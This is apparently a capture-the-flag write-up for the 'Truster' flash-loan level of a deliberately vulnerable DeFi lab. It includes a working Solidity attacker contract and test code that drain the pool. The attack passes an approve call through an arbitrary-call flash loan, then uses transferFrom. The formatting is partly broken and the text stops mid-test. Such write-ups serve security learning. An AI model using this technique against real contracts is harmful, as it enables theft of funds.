# Truster

## analyses

This challenge involves another flash loan contract offering loans for the DVT token. The goal is that stealing the money from pool  to drain money. And attacker gets TOKENS_IN_POOL ETH.

```js
after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
```

 The TrusterLenderPool contract accepts a custom function to call and a payload as its argument. This allows us to call any contract function on the flash loan contract’s behalf which can be exploited. 

```solidity
function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        damnValuableToken.transfer(borrower, borrowAmount);
        target.functionCall(data);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
```

First, we take a flash loan of `0` tokens (such that no repayment is required) and pass the token’s `approve` function as arguments with a payload that approves our attacker to withdraw all funds in a subsequent transaction. This works because the context under which `approve` is executed is the TrusterLenderPool contract because it is the one calling it.

```solidity
function attack(uint256 amount) external {
    	//msg.sender flashloan 0 ETH. Then pool approves this contract 'amount' ETH.
        pool.flashLoan(0, msg.sender, address(damnValuableToken), abi.encodeWithSignature("approve(address,uint256)", address(this), amount));
        //So this contract can transferFrom amount ETH.
        damnValuableToken.transferFrom(address(pool), msg.sender, amount);
    }
```

- TrusterAttacker

    constructor (address tokenAddress, address poolAddress) {
        damnValuableToken = IERC20(tokenAddress);
        pool = TrusterLenderPool(poolAddress);
    }

    function attack(uint256 amount) external {
    	//msg.sender flashloan 0 ETH. Then pool approves this contract 'amount' ETH.
        pool.flashLoan(0, msg.sender, address(damnValuableToken), abi.encodeWithSignature("approve(address,uint256)", address(this), amount));
        //So this contract can transferFrom amount ETH.
        damnValuableToken.transferFrom(address(pool), msg.sender, amount);
    }

    receive () external payable {}
}
```

```js
it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        const AttackerContractFactory = await ethers.getContractFactory('TrusterAttacker', deployer);
        const attackerContract = await AttackerContractFactory.deploy(this.token.address, this.pool.address);

        await attackerContract.connect(attacker).attack(TOKENS_IN_POOL);
